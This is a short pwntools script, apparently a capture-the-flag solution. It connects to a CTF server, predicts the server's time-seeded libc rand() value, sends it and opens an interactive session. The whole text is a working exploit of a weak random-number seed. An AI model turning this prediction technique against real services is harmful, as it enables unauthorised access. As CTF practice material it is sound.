from pwn import *
from ctypes import *

p = remote("ctf.j0n9hyun.xyz", 3014)
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(libc.time(0))
guess = libc.rand()
p.sendline(str(guess))
p.interactive()